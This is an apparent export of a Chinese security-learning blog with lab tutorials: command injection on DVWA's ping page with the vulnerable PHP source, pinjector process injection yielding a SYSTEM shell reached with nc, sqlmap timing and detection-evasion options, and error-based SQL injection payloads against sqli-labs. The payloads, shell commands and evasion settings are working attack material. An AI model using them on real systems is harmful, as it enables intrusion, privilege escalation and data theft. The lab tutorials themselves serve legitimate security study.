<h2 id="挖掘漏洞原则"><a href="#挖掘漏洞原则" class="headerlink" title="挖掘漏洞原则"></a>挖掘漏洞原则</h2><p><strong>挖掘漏洞原则是非常非常重要的</strong></p>
<ul>
<li>所有的变量<br>所有的变量都要去尝试，用各种各样的注入攻击手段尝试每一个变量每一个可以提交的数据的位置都要去尝试提交注入</li>
<li>所有的头<br>还要关住HTTP的头也是可以注入信息也可以完成相应的注入应为头也可以判断一个条件<br>重定要关注cookie（苦k）</li>
<li>逐个变量删除<br>应为在当前页面提交是不关注这些变量的按照逐个删除的方法来测试<br>叫没有用的变量删除这样我就不用这么麻烦在给没有用的变量测试了<br>下面是逐个删除没有用的变量<ul>
<li>下面这个是没有删除如何变量的可以正常访问网页的<br>蓝色是变量红色是变量值<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190914183804125.png" alt="在这里插入图片描述"><br>下面是叫没有用的变量删除掉，如果删除有用的变量就会响应的结果就有变化<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190914184348648.png" alt="在这里插入图片描述"></li>
</ul>
</li>
</ul>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>实验靶机metasploitable-linux-2.0.0里面的DVWA</p>
<h2 id="利用过滤字符在页面运行系统命令"><a href="#利用过滤字符在页面运行系统命令" class="headerlink" title="利用过滤字符在页面运行系统命令"></a>利用过滤字符在页面运行系统命令</h2><p><strong>这个页面是进行ping地址的</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190914185608734.png" alt="在这里插入图片描述"><br>分析这个页面</p>
<p>这个ping命令是从是从靶机发出来的，ping完然后返回给客户端<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190914190232522.png" alt="在这里插入图片描述"></p>
<pre><code>这个就发现这个ping和操作系统的ping一样会不会是会不会是服务器自己的主机ping的包返回过来的

比如程序员做出这个程序来他偷懒他直接调用系统命令来ping，应为ping自己做出来比较麻烦，程序员可能会调用系统命令直接返回给页面，</code></pre>
<p>发现和系统ping包一样下面是对比<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190914191626268.png" alt="在这里插入图片描述"><br>他他尽然是是直接运行操作系统的命令那么看看能不能运行其他命令<br>在系统里加个；就可以运行其他系统命令了；这个符合是在添加一个运行命令<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190914192300145.png" alt="在这里插入图片描述"><br>看看这个目标页面也是可以的这样就拿到了在页面直接运行系统命令<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190914192726516.png" alt="在这里插入图片描述"><br>注意了在BurpSuite工具里可以看见<br>在里请求是返回出现错误的是<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190914193248238.png" alt="在这里插入图片描述"><br>可以分析我输入；这个符合在URL里是怎么显示的，发现是%3B这个就有可能编码了，发现是URL编码<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190914193729852.png" alt="在这里插入图片描述"><br>实验靶机metasploitable-linux-2.0.0的ping后台源代码<br>安全级别低</p>
<pre><code>    &lt;?php
    if( isset( $_POST[ &#39;submit&#39; ] ) ) &#123;
    $target = $_REQUEST[ &#39;ip&#39; ];
    // Determine OS and execute the ping command.
    if (stristr(php_uname(&#39;s&#39;), &#39;Windows NT&#39;)) &#123; 
           $cmd = shell_exec( &#39;ping  &#39; . $target );
        echo &#39;&lt;pre&gt;&#39;.$cmd.&#39;&lt;/pre&gt;&#39;;
    &#125; else &#123; 
       $cmd = shell_exec( &#39;ping  -c 3 &#39; . $target );
        echo &#39;&lt;pre&gt;&#39;.$cmd.&#39;&lt;/pre&gt;&#39;;       
    &#125;
    &#125;
    ?&gt;

安全级别中</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;submit&#x27;</span>] ) ) &#123;</span><br><span class="line">$target = $_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"><span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">$substitutions = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"><span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (stristr(php_uname(<span class="string">&#x27;s&#x27;</span>), <span class="string">&#x27;Windows NT&#x27;</span>)) &#123; </span><br><span class="line"></span><br><span class="line">    $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.$cmd.<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"></span><br><span class="line">$cmd = shell_exec( <span class="string">&#x27;ping  -c 3 &#x27;</span> . $target );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.$cmd.<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>安全级别高</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#39;submit&#39; ] ) ) &#123;</span><br><span class="line">    $target &#x3D; $_REQUEST[&quot;ip&quot;];   </span><br><span class="line">    $target &#x3D; stripslashes( $target ); </span><br><span class="line">    &#x2F;&#x2F; Split the IP into 4 octects   </span><br><span class="line">    $octet &#x3D; explode(&quot;.&quot;, $target);  </span><br><span class="line">    &#x2F;&#x2F; Check IF each octet is an integer      </span><br><span class="line">    if ((is_numeric($octet[0])) &amp;&amp; (is_numeric($octet[1])) &amp;&amp; (is_numeric($octet[2])) &amp;&amp; (is_numeric($octet[3])) &amp;&amp; (sizeof($octet) &#x3D;&#x3D; 4)  ) &#123; </span><br><span class="line">    &#x2F;&#x2F; If all 4 octets are int&#39;s put the IP back together. </span><br><span class="line">    $target &#x3D; $octet[0].&#39;.&#39;.$octet[1].&#39;.&#39;.$octet[2].&#39;.&#39;.$octet[3];</span><br><span class="line">                &#x2F;&#x2F; Determine OS and execute the ping command.    </span><br><span class="line">    if (stristr(php_uname(&#39;s&#39;), &#39;Windows NT&#39;)) &#123; </span><br><span class="line">                $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">                    echo &#39;&lt;pre&gt;&#39;.$cmd.&#39;&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; else &#123; </span><br><span class="line">                    $cmd &#x3D; shell_exec( &#39;ping  -c 3 &#39; . $target );  </span><br><span class="line">                    echo &#39;&lt;pre&gt;&#39;.$cmd.&#39;&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;	                                       </span><br><span class="line">        else &#123;</span><br><span class="line">            echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
        <category>手动挖掘漏洞</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2. pinjector工具注入进程提权</title>
    <url>/2020/11/01/2.%E6%B3%A8%E5%85%A5%E8%BF%9B%E7%A8%8B%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="什么是注入进程提权"><a href="#什么是注入进程提权" class="headerlink" title="什么是注入进程提权"></a>什么是注入进程提权</h2><p>叫我的进程注入到system账户里面<br>或者是叫system账户进程注入到user普通用户里面<br>管理员非常难发现应为他注入到的是合法进程</p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>要翻墙下载地址<a href="http://www.tarasco.org/security/Process_Injector/">http://www.tarasco.org/security/Process_Injector/</a><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201102094227.png"><br>下面的就下载下来保持到了蓝奏云上面地址<a href="https://wwx.lanzoux.com/iWF2lhyvzre">https://wwx.lanzoux.com/iWF2lhyvzre</a></p>
<p>他会误报有病毒<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201102095633.png"></p>
<p>他有三个文件那那<code>.c</code>和<code>.h</code>是源码文件，还有一个执行文件<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201102100230.png"></p>
<h2 id="他的参数"><a href="#他的参数" class="headerlink" title="他的参数"></a>他的参数</h2><p>执行看一下他的参数<br>他就有两个参数<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201102100717.png"></p>
<p><code>-l</code> 是查看可以注入的进行<br><code>-p [PID]  [程序的名]  [端口]</code>就是注入进程，通过这个端口直接就可以用nc连接</p>
<h2 id="实咧"><a href="#实咧" class="headerlink" title="实咧"></a>实咧</h2><p>查看可以注入的进程<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pinjector.exe -l</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-11-02_10-18.png"></p>
<p>进行注入到system账户里面<br>我就随便选一个<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pinjector.exe -p  636 cmd 5555</span><br></pre></td></tr></table></figure>
<p><code>636</code>是注入的PID<br><code>cmd</code>要注入的程序<br><code>5555</code>指定的端口<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201102103902.png"><br>可以看到端口已经开启了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201102104015.png"></p>
<p>我们就可以在其他电脑上连接上那个提权到system的cmd了<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.31.135 5555</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201102104522.png"></p>
]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>3 sqlmap工具详细使用   任务095：SQLMAP自动注入扫描时间和优化</title>
    <url>/2019/11/19/3%20sqlma%E5%B7%A5%E5%85%B7%E8%AF%A6%E7%BB%86%E4%BD%BF%E7%94%A8%20%20%20%E4%BB%BB%E5%8A%A1095pSQLMAP%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5%E6%89%AB%E6%8F%8F%E6%97%B6%E9%97%B4%E5%92%8C%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>任务095：SQLMAP自动注入（二）-REQUEST和SQLMAP自动注入（三）-OPTIMIZATION</p>
<h2 id="设置时间参数"><a href="#设置时间参数" class="headerlink" title="设置时间参数"></a>设置时间参数</h2><h3 id="设置扫描时间"><a href="#设置扫描时间" class="headerlink" title="设置扫描时间"></a>设置扫描时间</h3><p>用sqlmap去扫描别人的网站会发送大量的请求可能目标服务器会发现你给你屏蔽掉，我们可以设置发送包的时间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--delay 要指定的时间				时间是秒</span><br></pre></td></tr></table></figure>
<h3 id="设置超时时间"><a href="#设置超时时间" class="headerlink" title="设置超时时间"></a>设置超时时间</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--timeout  要设置的时间          默认为30秒，30要没有响就超时了</span><br></pre></td></tr></table></figure>
<h3 id="尝试连接"><a href="#尝试连接" class="headerlink" title="尝试连接"></a>尝试连接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--retries  要设置的次数	比如超时时间设置30妙那么就是90妙</span><br></pre></td></tr></table></figure>
<h3 id="请求错误"><a href="#请求错误" class="headerlink" title="请求错误"></a>请求错误</h3><p>如果你发送大量的错误请求就会被防护机制被注销掉可以用–safe-url每请求错误几次就放送正常的请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--safe-url  要设置几次</span><br></pre></td></tr></table></figure>

<h2 id="过滤日志里的没有用的地址参数-scope"><a href="#过滤日志里的没有用的地址参数-scope" class="headerlink" title="过滤日志里的没有用的地址参数 --scope"></a>过滤日志里的没有用的地址参数 <code>--scope</code></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -l 日志文件  --scope&#x3D;&quot;(www)?\.target\.(com|net|org)“</span><br></pre></td></tr></table></figure>
<p>解释用日志文件扫描目标，日志文件可以有其他的不想扫描的地址可以用<code>--scope</code>进行过滤<br><code>--scope</code>代码里的意思，只扫描有<code>www.target.com</code>或<code>cet</code>或<code>org</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -l 日志文件 --scope&#x3D;&quot;(19)?\.168\.20\.(1|10|100)&quot; --level 3 --dbs</span><br></pre></td></tr></table></figure>
<p>只扫描前面是<code>19(0-255).168.20.1</code>或<code>10</code>或<code>100</code>的地址<br>演示一下<br>看一下日志有很多请求地址只扫描192.168.51.3或30或90里面User-agent也注入测试<code>--level&gt;=3</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019111518564381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">命令<code>sqlmap -l a  --scope=&quot;(19)?\.168\.51\.(3|30|90)&quot;  --level 3  --dbs</code>只扫描文件里<code>19(0-255).168.51.3</code>或<code>30</code>或<code>90</code>的地址<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191115190704594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="不URL编码加上这个参数-skip-urlencode"><a href="#不URL编码加上这个参数-skip-urlencode" class="headerlink" title="不URL编码加上这个参数--skip-urlencode"></a>不URL编码加上这个参数<code>--skip-urlencode</code></h2><h2 id="每次请求前执行指定的python代码进行请求的变量参数进行修改添加叫你每次请求的内容都不同"><a href="#每次请求前执行指定的python代码进行请求的变量参数进行修改添加叫你每次请求的内容都不同" class="headerlink" title="每次请求前执行指定的python代码进行请求的变量参数进行修改添加叫你每次请求的内容都不同"></a>每次请求前执行指定的python代码进行请求的变量参数进行修改添加叫你每次请求的内容都不同</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--eval&#x3D;&quot;写的脚步&quot;</span><br></pre></td></tr></table></figure>
<h2 id="OPTIMIZATION-优化"><a href="#OPTIMIZATION-优化" class="headerlink" title="OPTIMIZATION(优化)"></a>OPTIMIZATION(优化)</h2><p>OPTIMIZATION：优化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-o					打开所有优化开关</span><br><span class="line"></span><br><span class="line">--predict-output	预测公共查询输出</span><br><span class="line"></span><br><span class="line">--keep-alive 		使用永久HTTP（s）连接</span><br><span class="line"></span><br><span class="line">--null-connection 	没有实际HTTP响应正文的页长度</span><br><span class="line"></span><br><span class="line">--threads&#x3D;THREADS   最大并发HTTP（s）请求数（默认值1</span><br></pre></td></tr></table></figure>
<ul>
<li>-O<br><code>-O</code>就是用一个-O就是用代替下面的所有参数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--predict-output	预测公共查询输出</span><br><span class="line">--keep-alive 		使用永久HTTP（s）连接</span><br><span class="line">--null-connection 	没有实际HTTP响应正文的页长度</span><br></pre></td></tr></table></figure>
<h3 id="–predict-output"><a href="#–predict-output" class="headerlink" title="–predict-output"></a>–predict-output</h3><ul>
<li>通常sqlmap扫描时间不叫长可以用优化参数 </li>
<li>根据检测方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率</li>
</ul>
<ul>
<li>版本名、用户名、密码、Privileges、role、数据库名称、表名、列名</li>
</ul>
<ul>
<li>与 –threads 参数不兼容就是你用了–threads那就不能用了–predict-output    </li>
</ul>
<ul>
<li>统计表默认位置:/usr/share/sqlmap/data/txtcommon-outputs.txt</li>
</ul>
<h3 id="–keep-alive"><a href="#–keep-alive" class="headerlink" title="–keep-alive"></a>–keep-alive</h3><ul>
<li>使用 http(s) 长连接，性能好</li>
</ul>
<ul>
<li>与 –proxy 参数不兼容就是你用了–proxy 那就不能用了 –keep-alive</li>
</ul>
<ul>
<li>长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源（节省网络开销，但是会占用服务器资源，防止重复建立连接时被服务器端检测发现）<h3 id="–null-connection"><a href="#–null-connection" class="headerlink" title="–null-connection"></a>–null-connection</h3></li>
<li>只获取相应页面的大小值，而非页面具体内容</li>
</ul>
<ul>
<li><p>通常用于盲注判断 真/假，降低网络带宽消耗</p>
</li>
<li><p>与–text-only参数不兼容（基于页面内容的比较判断 真/假</p>
<h3 id="–threads"><a href="#–threads" class="headerlink" title="–threads"></a>–threads</h3></li>
<li><p>最大并发线程</p>
</li>
</ul>
<ul>
<li>盲注时每个线程获取一个字符（7次请求）。获取完成后线程结果</li>
<li>默认值为1，建议不要超过10,否则可能影响站点可用性</li>
</ul>
<ul>
<li>与 –predict-output参数不兼容</li>
</ul>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>3. 网易web安全渗透，sql注入之报错注入</title>
    <url>/2020/08/10/3.%20%E7%BD%91%E6%98%93sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="报错注入漏洞原理和应用"><a href="#报错注入漏洞原理和应用" class="headerlink" title="报错注入漏洞原理和应用"></a>报错注入漏洞原理和应用</h2><ul>
<li>构造 payload(有效载荷)让信息通过错误提示回显出来</li>
<li>适合应用场景:<br>进行注入查询不回现内容,会打印sql错误信息<br>Update、 insert等语句,会打印错误信息</li>
</ul>
<p><strong>查看一下下面的代码</strong><br>可以看到</p>
<ol>
<li>sql执行对了就打印出谢谢</li>
<li>sql执行错了就打印出sql的报错的信息</li>
</ol>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200801181137465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<p>原理图<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200801181621183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<h2 id="报错注入方法"><a href="#报错注入方法" class="headerlink" title="报错注入方法"></a>报错注入方法</h2><p>凡是可以让错误信息显示的函数(语句)，都能实现报错注入，这里我们列举3种，还有其他的</p>
<h3 id="floor-函数报错注入"><a href="#floor-函数报错注入" class="headerlink" title="floor()函数报错注入"></a>floor()函数报错注入</h3><p>下面使用的是users数据库<br>sql语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">users</span>  <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>((<span class="keyword">select</span> 要执行的<span class="keyword">sql</span>语句),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>));</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020080313573774.png" alt="在这里插入图片描述"><br><strong>上面代码分析</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">floor()是取整数</span><br><span class="line">rand()在0和1之间产生一个随机数</span><br><span class="line">rand(0)*2将取0到2的随机数</span><br><span class="line">floor(rand()*2)有两条记录就会报错</span><br><span class="line">floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的</span><br><span class="line">count(*)是用来统计结果的，相当于刷新一次结果</span><br><span class="line">group by在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在的话count(*)加1</span><br><span class="line">在使用group by时floor(rand(0)*2)会被执行一次，若虚表不存在记录，插入虚表时会再执行一次</span><br></pre></td></tr></table></figure>
<p>在这张虚拟表中，group by后面的字段作为主键，所以这张表中主键是name，这样我们就基本弄清报错的原因了，其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
<p><strong>上面的代码介绍</strong></p>
<ol>
<li><code>count(*)</code>        函数就进行读取数据库的数据有多少行<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803140156558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li><code>group by</code>   函数是用来排序的</li>
</ol>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803144300652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3. <code>concat()</code> 函数是叫字符连接起来<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803151038546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4. rand()和floor()函数<br>rand()生成随机数<br>上面的rand(0)*2的意思就是产生0或1的随机数<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803151938224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>floor()函数<br>就是省略小数点后面的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803162446604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="sqli-labs第5关实战"><a href="#sqli-labs第5关实战" class="headerlink" title="sqli-labs第5关实战"></a>sqli-labs第5关实战</h4><p>URL输入<code>http://192.168.0.104/Less-5/?id=1</code><br>发现显示一个<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803171208967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>URL输入<code>http://192.168.0.104/Less-5/?id=1 &#39; and 1=2  --+</code><br>就不显示了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803171400485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>上面这个就可以报错注入了</strong></p>
<ol>
<li>读取数据<br>URL地址<code>http://192.168.0.104/Less-5/?id=1 &#39;and(select count(*) from users  group by concat((select user()),floor(rand(0)*2)))  --+</code> </li>
</ol>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803184858664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2. 读取数据库<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803185153935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>读取更多信息查看<a href="https://blog.csdn.net/qq_41860876/article/details/107694026">2. 网易web安全渗透 union联合查询注入</a></p>
<h3 id="extractvalue-函数"><a href="#extractvalue-函数" class="headerlink" title="extractvalue()函数"></a>extractvalue()函数</h3><p>接受两个参数，第一个XML，第二个XPath语句</p>
<p>这个我遇见个问题有的地方运行不起来不知道怎么回事，可能是版本问题还是数据库问题，就不研究了，下面是演示是可以的</p>
<p><strong>下面我输入1和2</strong><br>代码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="number">2</span>) ;</span><br></pre></td></tr></table></figure>
<p>结果<br>我们输入2他也是认为是XPath语句<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803182828892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>我们输入1,’2!’</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="string">&#x27;2!&#x27;</span>) ;</span><br></pre></td></tr></table></figure>
<p>就报错了，!是XPath语句<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020080318314676.png" alt="在这里插入图片描述"><br>我们在输入一个语句就被执行了</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())) ;</span><br></pre></td></tr></table></figure>
<p>结果，输出了<code>@localhost</code><br>我们要的想要的结果是<code>root@localhost</code><br>应为<code>root</code>他认为是合法的，<code>@</code>是不合法的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020080318360045.png" alt="在这里插入图片描述"><br><strong>通过上面的结果就可以用concat()函数进行提前报错，显示完全的</strong><br>代码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="string">&#x27;!&#x27;</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()))) ;</span><br></pre></td></tr></table></figure>
<p>结果<br>叫可以看见叫全部给输出出来了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803184018994.png" alt="在这里插入图片描述"><br>可以用16进制进行输入<br>代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e)) ;</span><br></pre></td></tr></table></figure>
<p>结果<code>0x7e就是16进制的~</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020080318435388.png" alt="在这里插入图片描述"></p>
<h4 id="sqli-labs第5关实战-1"><a href="#sqli-labs第5关实战-1" class="headerlink" title="sqli-labs第5关实战"></a>sqli-labs第5关实战</h4><ol>
<li>读取数据<br>URL地址<code>http://192.168.0.104/Less-5/?id=1 &#39;and(select extractvalue(1,concat(0x7e,(select user()),0x7e)))  --+</code> </li>
</ol>
